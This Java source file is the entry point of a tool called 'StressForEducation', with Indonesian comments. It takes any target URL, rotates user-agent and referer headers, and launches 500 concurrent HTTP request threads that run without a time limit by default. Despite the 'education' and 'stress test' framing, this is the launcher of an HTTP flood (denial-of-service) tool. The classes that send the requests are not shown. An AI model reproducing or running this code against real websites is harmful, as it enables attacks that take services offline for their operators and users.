package com.josemarcellio.stresser;

public class StressForEducation {
    public static void main(String[] args) {
        if (args.length < 1) {
            usage();
            return;
        }

        String url = args[0];
        int duration = Integer.MAX_VALUE; // Default untuk stress test tanpa durasi waktu

        if (args.length == 2) {
            try {
                duration = Integer.parseInt(args[1]) * 1000; // Konversi detik ke milidetik
            } catch (NumberFormatException e) {
                System.out.println("Format tidak valid, ketik angka dengan benar!");
            }
        }

        if (!url.contains("/")) {
            url += "/";
        }

        String host = url.split("/")[2];

        HTTPClient.setUrl(url);
        HTTPClient.setHost(host);
        HTTPClient.initializeUserAgentList();
        HTTPClient.initializeRefererList();

        System.out.println("-- Stress Test Dimulai --");

        for (int i = 0; i < 500; i++) {
            new HTTPThread().start();
        }
        new MonitorThread(duration).start();
    }

    private static void usage() {
        System.out.println("---------------------------------------------------");
        System.out.println("java -jar StressForEducation.jar <url> <durasi>");
        System.out.println("---------------------------------------------------");
    }
}
